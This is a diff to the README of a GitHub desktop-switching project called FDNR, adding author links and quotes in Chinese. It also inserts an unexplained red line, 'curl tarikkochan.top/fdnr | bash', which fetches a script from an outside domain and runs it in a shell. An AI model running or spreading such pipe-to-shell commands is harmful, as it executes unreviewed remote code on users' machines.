@@ -1,12 +1,14 @@
 # FDNR - FishDeskNext: Reborn
 
+<center style='color:red;'> curl tarikkochan.top/fdnr | bash </center>
+
 [![.NET Core Desktop](https://github.com/liziyu0714/FishDeskNextReborn/actions/workflows/dotnet-desktop.yml/badge.svg)](https://github.com/liziyu0714/FishDeskNextReborn/actions/workflows/dotnet-desktop.yml)
 
 > 写更多Next，不止于切换桌面。
-> ——liziyu0714
+> ——[liziyu0714](https://github.com/liziyu0714/)
 > 
 > 我首先反驳OOB不能为任务所驱动的刁钻说法；譬如FDNR便是个有力的“反驳的反驳”。
-> ——幸草_Tarikko-ScetayhChan
+> ——[幸草_Tarikko-ScetayhChan](https://github.com/Tarikko-ScetayhChan)
 
 FDNR在fsw被基本完成之前将不会有**任何**的功能更新。
 
